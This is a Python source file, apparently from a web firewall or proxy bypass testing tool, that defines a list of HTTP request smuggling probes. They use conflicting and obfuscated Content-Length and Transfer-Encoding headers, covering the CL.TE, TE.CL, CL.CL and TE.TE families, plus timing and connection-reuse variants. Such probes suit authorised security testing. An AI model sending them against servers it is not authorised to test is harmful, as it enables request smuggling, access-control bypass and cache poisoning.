from __future__ import annotations

from typing import Any

from bypass.models import Payload, PayloadCategory


def smuggling_lite_payloads() -> list[tuple[dict[str, str], bytes, Payload]]:
    out: list[tuple[dict[str, str], bytes, Payload]] = []

    def add(
        hdrs: dict[str, str],
        body: bytes,
        pid: str,
        label: str,
        *,
        raw_headers: list[tuple[str, str]] | None = None,
        **metadata: Any,
    ) -> None:
        meta = {
            "raw_headers": raw_headers or list(hdrs.items()),
            "family": metadata.pop("family", "generic"),
            **metadata,
        }
        out.append(
            (
                hdrs,
                body,
                Payload(id=pid, category=PayloadCategory.SMUGGLING, label=label, metadata=meta),
            )
        )

    add(
        {"Content-Length": "4", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_cl_te_basic",
        "CL.TE baseline conflict",
        family="cl_te",
    )
    add(
        {"Content-Length": "4", "Transfer-Encoding": "chunked", "Connection": "keep-alive"},
        b"0\r\n\r\n",
        "smuggle_cl_te_keepalive",
        "CL.TE with keep-alive",
        family="cl_te",
        reuse_connection=True,
    )
    add(
        {"Transfer-Encoding": "chunked", "Content-Length": "6"},
        b"0\r\n\r\n",
        "smuggle_te_cl_basic",
        "TE.CL baseline conflict",
        family="te_cl",
        raw_headers=[("Transfer-Encoding", "chunked"), ("Content-Length", "6")],
    )
    add(
        {"Content-Length": "5"},
        b"HELLO",
        "smuggle_cl_cl_split",
        "CL.CL duplicate split values",
        family="cl_cl",
        raw_headers=[("Content-Length", "5"), ("Content-Length", "6")],
    )
    add(
        {"Content-Length": "6"},
        b"HELLO!",
        "smuggle_cl_cl_reverse",
        "CL.CL duplicate reversed values",
        family="cl_cl",
        raw_headers=[("Content-Length", "6"), ("Content-Length", "5")],
    )
    add(
        {"Transfer-Encoding": " chunked", "Content-Length": "4"},
        b"0\r\n\r\n",
        "smuggle_te_space",
        "TE obfuscation leading space",
        family="te_cl",
    )
    add(
        {"Transfer-Encoding": "chunked", "Content-Length": "4, 5"},
        b"0\r\n\r\n",
        "smuggle_dup_cl_comma",
        "Duplicated CL comma style",
        family="cl_cl",
    )
    add(
        {"Content-Length": "0", "Transfer-Encoding": "chunked", "X-Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_x_te",
        "X-Transfer-Encoding confusion",
        family="te_cl",
    )
    add(
        {"Content-Length": "4", "Transfer-Encoding": "chunked, identity"},
        b"0\r\n\r\n",
        "smuggle_te_multi",
        "TE multiple values",
        family="cl_te",
    )
    add(
        {"Content-Length": "4", "Transfer-Encoding": "Chunked"},
        b"0\r\n\r\n",
        "smuggle_te_casing",
        "TE mixed casing",
        family="cl_te",
    )
    add(
        {"Content-Length": "04", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_cl_leading_zero",
        "CL leading zero + TE",
        family="cl_te",
    )
    add(
        {"Content-Length": "+4", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_cl_plus",
        "CL plus sign + TE",
        family="cl_te",
    )
    add(
        {"Content-Length": "4 ", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_cl_space",
        "CL trailing space + TE",
        family="cl_te",
    )
    add(
        {"Content-Length": "4\t", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_cl_tab",
        "CL trailing tab + TE",
        family="cl_te",
    )
    add(
        {"Content-Length": "4", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_dup_cl_split",
        "Duplicate Content-Length split values",
        family="cl_cl",
        raw_headers=[("Content-Length", "4"), ("Content-Length", "5"), ("Transfer-Encoding", "chunked")],
    )
    add(
        {"Content-Length": "4", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_dup_te_split",
        "Duplicate Transfer-Encoding split values",
        family="te_te",
        raw_headers=[("Content-Length", "4"), ("Transfer-Encoding", "identity"), ("Transfer-Encoding", "chunked")],
    )
    add(
        {"Content-Length": "12", "Transfer-Encoding": "chunked"},
        b"0\r\n\r\n",
        "smuggle_pause_cl_te",
        "CL.TE pause after headers",
        family="cl_te",
        pause_after_headers_ms=550,
        timing_probe=True,
    )
    add(
        {"Transfer-Encoding": "chunked", "Content-Length": "12"},
        b"0\r\n\r\n",
        "smuggle_pause_te_cl",
        "TE.CL pause after headers",
        family="te_cl",
        pause_after_headers_ms=550,
        timing_probe=True,
        raw_headers=[("Transfer-Encoding", "chunked"), ("Content-Length", "12")],
    )
    add(
        {"Content-Length": "4", "Transfer-Encoding": "chunked", "Connection": "keep-alive"},
        b"0\r\n\r\n",
        "smuggle_reuse_cl_te",
        "CL.TE connection reuse timing",
        family="cl_te",
        reuse_connection=True,
        reuse_timing_probe=True,
        reuse_delay_ms=150,
    )
    return out
